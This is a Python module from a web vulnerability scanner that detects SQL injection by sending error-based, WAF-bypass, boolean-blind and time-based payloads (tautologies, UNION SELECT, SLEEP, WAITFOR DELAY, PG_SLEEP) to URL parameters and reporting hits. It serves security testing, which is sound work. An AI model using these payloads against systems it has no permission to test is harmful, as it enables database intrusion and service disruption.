"""
SQL Injection detection module.
Ported from AWVS10: classSQLInjection.inc, Blind_Sql_Injection.script

Three detection methods:
1. Error-based: Inject quotes, check for DB error messages
2. Boolean blind: Double-round arithmetic comparison (AWVS technique)
3. Time-based blind: Permuted timing probes (AWVS technique)
"""
import re
import random
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .base import BaseModule
from ..core.reporter import Finding
from ..payloads.sqli_errors import (
    detect_sql_error,
    fingerprint_db,
    WAF_BYPASS_PAYLOADS,
    TIME_PAYLOADS_EXTENDED,
)


class SQLiModule(BaseModule):
    name = "sqli"
    description = "SQL Injection (Error, Boolean Blind, Time Blind)"

    ERROR_PAYLOADS = [
        "'",
        '"',
        "' OR '1'='1",
        "' AND '1'='2",
        "1' ORDER BY 1--",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "1;SELECT 1",
        "') OR ('1'='1",
        "1' AND 1=CONVERT(int,@@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    ]

    WAF_BYPASS_SETS = WAF_BYPASS_PAYLOADS

    BOOLEAN_TRUE_FALSE_PAIRS = [
        ("AND 2*3*8=6*8", "AND 2*3*8=6*9"),
        ("AND 3*2=6", "AND 3*2=7"),
        ("AND 5*4=20", "AND 5*4=21"),
        ("AND 7*8=56", "AND 7*8=57"),
        ("AND 9*3=27", "AND 9*3=28"),
        ("AND 11*2=22", "AND 11*2=23"),
    ]

    TIME_PAYLOADS = {
        "mysql": [
            ("' AND SLEEP({t})-- ", "sleep"),
            ("' AND (SELECT * FROM (SELECT SLEEP({t}))a)-- ", "sleep"),
            ("1 AND SLEEP({t})", "sleep"),
            ("' OR SLEEP({t})-- ", "sleep"),
        ],
        "mssql": [
            ("'; WAITFOR DELAY '0:0:{t}'-- ", "waitfor"),
            ("1; WAITFOR DELAY '0:0:{t}'-- ", "waitfor"),
        ],
        "postgresql": [
            ("'; SELECT PG_SLEEP({t})-- ", "pg_sleep"),
            ("1; SELECT PG_SLEEP({t})", "pg_sleep"),
            ("' AND (SELECT * FROM PG_SLEEP({t}))::text='1", "pg_sleep"),
        ],
        "generic": [
            ("' AND SLEEP({t})-- ", "sleep"),
            ("'; WAITFOR DELAY '0:0:{t}'-- ", "waitfor"),
            ("'; SELECT PG_SLEEP({t})-- ", "pg_sleep"),
        ],
    }

    def run(self, url: str, params: dict = None):
        self.log(f"Testing: {url}")
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            query_params.update({k: [v] for k, v in params.items()})

        if not query_params:
            self.log("No parameters to test")
            return

        for param_name in query_params:
            original_value = query_params[param_name][0]
            self.log(f"Testing param: {param_name}")
            self._test_error_based(url, parsed, query_params, param_name, original_value)
            self._test_waf_bypass(url, parsed, query_params, param_name, original_value)
            self._test_boolean_blind(url, parsed, query_params, param_name, original_value)
            self._test_time_blind(url, parsed, query_params, param_name, original_value)

    def _build_url(self, parsed, query_params, param_name, payload):
        modified = dict(query_params)
        modified[param_name] = [payload]
        query_string = urlencode({k: v[0] for k, v in modified.items()})
        return urlunparse(parsed._replace(query=query_string))

    def _test_error_based(self, url, parsed, query_params, param_name, original_value):
        baseline = self.http.get(url)
        if not baseline:
            return
        baseline_body = baseline.content.decode('utf-8', errors='replace')

        baseline_has_error, _ = detect_sql_error(baseline_body)

        for payload in self.ERROR_PAYLOADS:
            test_value = original_value + payload
            test_url = self._build_url(parsed, query_params, param_name, test_value)
            resp = self.http.get(test_url)
            if not resp:
                continue
            resp_body = resp.content.decode('utf-8', errors='replace')

            found, pattern = detect_sql_error(resp_body)
            if found and not baseline_has_error:
                db = fingerprint_db(resp_body)
                self.reporter.add(Finding(
                    vuln_type="SQL Injection (Error-based)",
                    severity="HIGH",
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=pattern,
                    details=f"Database: {db}",
                ))
                return

    def _test_waf_bypass(self, url, parsed, query_params, param_name, original_value):
        baseline = self.http.get(url)
        if not baseline:
            return
        baseline_body = baseline.content.decode('utf-8', errors='replace')
        baseline_has_error, _ = detect_sql_error(baseline_body)

        for category, payloads in self.WAF_BYPASS_SETS.items():
            for payload in payloads:
                test_val = original_value + payload
                test_url = self._build_url(parsed, query_params, param_name, test_val)
                resp = self.http.get(test_url)
                if not resp:
                    continue
                resp_body = resp.content.decode('utf-8', errors='replace')
                found, pattern = detect_sql_error(resp_body)
                if found and not baseline_has_error:
                    db = fingerprint_db(resp_body)
                    self.reporter.add(Finding(
                        vuln_type="SQL Injection (WAF Bypass)",
                        severity="HIGH",
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=pattern,
                        details=f"Bypass category: {category}, Database: {db}",
                    ))
                    return

    def _get_filtered_body(self, body: str, original_value: str) -> str:
        filtered = body
        filtered = re.sub(r"\d{1,2}:\d{2}(:\d{2})?(\s*(AM|PM))?", "", filtered)
        filtered = re.sub(r"\d{10,}", "", filtered)
        if original_value:
            filtered = filtered.replace(original_value, "")
        filtered = re.sub(r"<script[^>]*>.*?</script>", "", filtered, flags=re.DOTALL | re.IGNORECASE)
        filtered = re.sub(r"<style[^>]*>.*?</style>", "", filtered, flags=re.DOTALL | re.IGNORECASE)
        return filtered

    def _test_boolean_blind(self, url, parsed, query_params, param_name, original_value):
        resp1 = self.http.get(url)
        resp2 = self.http.get(url)
        if not resp1 or not resp2:
            return

        resp1_body = resp1.content.decode('utf-8', errors='replace')
        resp2_body = resp2.content.decode('utf-8', errors='replace')
        body1 = self._get_filtered_body(resp1_body, original_value)
        body2 = self._get_filtered_body(resp2_body, original_value)
        if body1 != body2:
            self.log(f"  Response not stable for {param_name}, skipping blind test")
            return

        rand_val = str(random.randint(100000, 999999))
        rand_url = self._build_url(parsed, query_params, param_name, rand_val)
        rand_resp = self.http.get(rand_url)
        if not rand_resp:
            return
        rand_resp_body = rand_resp.content.decode('utf-8', errors='replace')
        rand_body = self._get_filtered_body(rand_resp_body, rand_val)

        if body1 == rand_body:
            return

        confirmed = 0
        for true_expr, false_expr in self.BOOLEAN_TRUE_FALSE_PAIRS:
            true_val = f"{original_value} {true_expr}"
            false_val = f"{original_value} {false_expr}"

            true_url = self._build_url(parsed, query_params, param_name, true_val)
            false_url = self._build_url(parsed, query_params, param_name, false_val)

            true_resp = self.http.get(true_url)
            false_resp = self.http.get(false_url)
            if not true_resp or not false_resp:
                continue

            true_resp_body = true_resp.content.decode('utf-8', errors='replace')
            false_resp_body = false_resp.content.decode('utf-8', errors='replace')
            true_body = self._get_filtered_body(true_resp_body, true_val)
            false_body = self._get_filtered_body(false_resp_body, false_val)

            if true_body == body1 and false_body != body1:
                confirmed += 1

        if confirmed >= 4:
            reconfirmed = 0
            alt_pairs = [
                ("AND 13*2=26", "AND 13*2=27"),
                ("AND 17*3=51", "AND 17*3=52"),
                ("AND 19*5=95", "AND 19*5=96"),
                ("AND 23*7=161", "AND 23*7=162"),
            ]
            for true_expr, false_expr in alt_pairs:
                true_val = f"{original_value} {true_expr}"
                false_val = f"{original_value} {false_expr}"
                true_url = self._build_url(parsed, query_params, param_name, true_val)
                false_url = self._build_url(parsed, query_params, param_name, false_val)
                true_resp = self.http.get(true_url)
                false_resp = self.http.get(false_url)
                if not true_resp or not false_resp:
                    continue
                true_resp_body = true_resp.content.decode('utf-8', errors='replace')
                false_resp_body = false_resp.content.decode('utf-8', errors='replace')
                true_body = self._get_filtered_body(true_resp_body, true_val)
                false_body = self._get_filtered_body(false_resp_body, false_val)
                if true_body == body1 and false_body != body1:
                    reconfirmed += 1

            if reconfirmed >= 3:
                self.reporter.add(Finding(
                    vuln_type="SQL Injection (Boolean Blind)",
                    severity="HIGH",
                    url=url,
                    parameter=param_name,
                    payload=f"{original_value} AND 2*3*8=6*8",
                    evidence=f"Confirmed with {confirmed}+{reconfirmed} true/false differential pairs",
                    details="Double-round arithmetic comparison confirmed differential responses",
                ))
                return

    def _test_time_blind(self, url, parsed, query_params, param_name, original_value):
        timing_sets = list(self.TIME_PAYLOADS.get("generic", []))
        random.shuffle(timing_sets)

        for payload_template, technique in timing_sets[:2]:
            delays = [0, 3, 6, 9]
            random.shuffle(delays)
            timings = {}

            all_ok = True
            for d in delays:
                payload = payload_template.format(t=d)
                test_val = original_value + payload
                test_url = self._build_url(parsed, query_params, param_name, test_val)
                resp, elapsed = self.http.timed_request("GET", test_url, timeout=max(d + 10, 15))
                if resp is None and elapsed < 1:
                    all_ok = False
                    break
                timings[d] = elapsed

            if not all_ok or len(timings) < 4:
                continue

            sorted_delays = sorted(timings.keys())
            monotonic = all(
                timings[sorted_delays[i]] < timings[sorted_delays[i + 1]] - 1
                for i in range(len(sorted_delays) - 1)
            )

            if monotonic and timings[sorted_delays[-1]] > sorted_delays[-1] * 0.8:
                verify_payload = payload_template.format(t=5)
                test_val = original_value + verify_payload
                test_url = self._build_url(parsed, query_params, param_name, test_val)
                _, verify_time = self.http.timed_request("GET", test_url, timeout=20)
                if verify_time >= 4.0:
                    self.reporter.add(Finding(
                        vuln_type="SQL Injection (Time-based Blind)",
                        severity="HIGH",
                        url=url,
                        parameter=param_name,
                        payload=verify_payload,
                        evidence=f"Timing: {', '.join(f'{d}s->{timings[d]:.1f}s' for d in sorted_delays)}",
                        details=f"Technique: {technique}. Verified with 5s delay -> {verify_time:.1f}s",
                    ))
                    return
